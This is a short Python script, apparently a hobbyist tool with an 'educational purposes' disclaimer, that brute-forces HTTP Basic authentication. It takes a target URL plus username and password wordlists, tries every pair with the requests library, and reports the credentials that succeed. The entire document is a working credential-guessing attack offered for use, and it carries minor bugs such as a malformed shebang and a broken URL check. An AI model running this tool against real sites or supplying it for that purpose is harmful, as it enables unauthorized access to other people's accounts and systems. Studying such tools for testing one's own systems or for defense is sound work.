#/bin/python
#Bruteforece HTTP auth coded by Yannvl. 
#Use only for educational purposes.

#Need to install python requests: pip install requests/easy_install requests
import requests
#import os
import sys
from sys import argv

#arguments; script name, username list, password list, proxy adress form of http://IP:port, website
script, userlist, passlist, site = argv

#os.environ['HTTP_PROXY'] = proxy

#make list, enter string site in list. place 0.
web = []
web.append(site)
#check if there is http:// in front of site, otherwise add it to the string site
if web[0:7] != "http://":
	web[0] = "http://" + str(site)
else:
	print "No good URL with http !!!"

print "Password Brute-Forcing target: " + web[0] + "\n\n"
#Check if url is up
url = requests.get(web[0])
if url.status_code == 401:

	with open(userlist) as usernames:
		users = usernames.read().splitlines()

	with open(passlist) as passwords:
		passes = passwords.read().splitlines()

	for user in users:
		for password in passes:
			print "Trying %s : %s" %(user, password)

			login = user, password
			req = requests.get(url=web[0], auth=(login))

			if req.status_code == 200:
				print "Success on: Username = %s and Password = %s <--!" % (user, password)
			else:
				print "Failure to login. Wrong username and password."
else:
	print "Website not online or not a valid HTTP basic AUTH!"
	sys.exit()
